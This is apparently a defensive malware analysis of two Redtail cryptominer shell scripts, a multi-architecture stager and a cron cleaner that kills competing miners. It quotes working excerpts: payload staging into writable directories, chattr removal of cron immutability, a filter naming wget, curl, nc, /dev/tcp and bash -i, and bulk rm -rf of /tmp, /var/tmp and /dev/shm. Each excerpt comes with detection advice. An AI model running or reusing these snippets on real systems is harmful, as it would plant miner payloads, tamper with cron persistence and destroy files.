
# Unified Script Analysis — Stager and Cleaner

**Repository:** `/home/kali/malware/redtail`
**Files:** Stager and Cleaner scripts (concise annotated excerpts)

---

## Overview
This file summarizes the behavioral analysis of two Redtail malware scripts:
- **Part A:** Stager script (multi-architecture deployment)
- **Part B:** Cleaner script (cron sanitizer and competitor-killer)

---

# Part A — Stager Script Analysis

**Purpose:** Multi-architecture stager that detects system architecture, avoids noexec mounts, deploys the matching binary, and cleans up staging artifacts.

### Block 1 — Architecture detection
```bash
NOARCH=false
ARCH=$(uname -mp)
if echo "$ARCH" | grep -q "x86_64" || echo "$ARCH" | grep -q "amd64"; then
  ARCH="x86_64"
elif echo "$ARCH" | grep -q "i[3456]86"; then
  ARCH="i686"
elif echo "$ARCH" | grep -q "armv8" || echo "$ARCH" | grep -q "aarch64"; then
  ARCH="arm8"
elif echo "$ARCH" | grep -q "armv7"; then
  ARCH="arm7"
else
  NOARCH=true
fi
```
**Analysis:** Uses `uname -mp` to determine CPU platform and normalize architecture names. Enables broad targeting across IoT and server devices.

**Detection:** Scripts calling `uname -m` and branching on `x86_64`, `armv7`, `aarch64`, etc.

---

### Block 2 — Noexec mount detection & staging
```bash
NOEXEC_DIRS=$(cat /proc/mounts | grep 'noexec' | awk '{print $2}')
FOLDERS=$(eval find / -type d -user $(whoami) -perm -u=rwx -not -path "/tmp/*" -not -path "/proc/*" 2>/dev/null)
for i in $FOLDERS /tmp /var/tmp /dev/shm; do
  cp -r "$CURR"/redtail.* "$i"
done
```
**Analysis:** Scans filesystem for writable executable directories to stage payloads. Attempts /tmp, /var/tmp, /dev/shm for deployment.

**Detection:** File creation or `cp` activity in `/dev/shm` or `/tmp` by unknown scripts.

---

### Block 3 — Binary selection & cleanup
```bash
if [ $NOARCH = true ]; then
  cat redtail.$a >$FILENAME
  chmod +x $FILENAME
else
  cat redtail.$ARCH >$FILENAME
  chmod +x $FILENAME
fi
rm -rf redtail.*
```
**Analysis:** Writes chosen payload to executable file, makes it runnable, and deletes artifacts afterward.

**Detection:** Combined use of `cat`, `chmod +x`, and `rm -rf redtail.*` in sequence.

---

# Part B — Cleaner Script Analysis

**Purpose:** Removes competing miners and sanitizes cron persistence entries.

### Block A — clean_crontab()
```bash
clean_crontab() {
  chattr -ia "$1"
  grep -vE 'wget|curl|/dev/tcp|/tmp|\.sh|nc|bash -i|sh -i|base64 -d' "$1" >/tmp/clean_crontab
  mv /tmp/clean_crontab "$1"
}
```
**Analysis:** Cleans cron jobs of remote-download or reverse-shell commands. `chattr -ia` overrides immutability flags to enable edits.

**Detection:** `chattr -ia` on cron files or creation of `/tmp/clean_crontab` temporary files.

---

### Block B — Cron sweep
```bash
chattr -ia /var/spool/cron/crontabs
for user_cron in /var/spool/cron/crontabs/*; do
  [ -f "$user_cron" ] && clean_crontab "$user_cron"
done
for system_cron in /etc/crontab /etc/crontabs; do
  [ -f "$system_cron" ] && clean_crontab "$system_cron"
done
```
**Analysis:** Recursively cleans user and system cron jobs; suppresses persistence of other malware.

**Detection:** Monitor for repeated cron edits and chattr commands across multiple cron paths.

---

### Block C — Cleanup
```bash
for i in /tmp /var/tmp /dev/shm; do
  rm -rf $i/*
done
```
**Analysis:** Deletes contents of common writable temp directories to remove competitor files and staging artifacts.

**Detection:** Bulk delete patterns under `/tmp` or `/dev/shm` by suspicious users.

---

# Defensive Recommendations Summary
1. Enforce `noexec` on `/tmp` and `/var/tmp` where possible.
2. Monitor for `chattr` use on cron files and directories.
3. Alert on `cat redtail.*` and `chmod +x` patterns.
4. Maintain integrity monitoring on cron and systemd directories.
5. Correlate CPU utilization spikes with potential mining payloads.


---


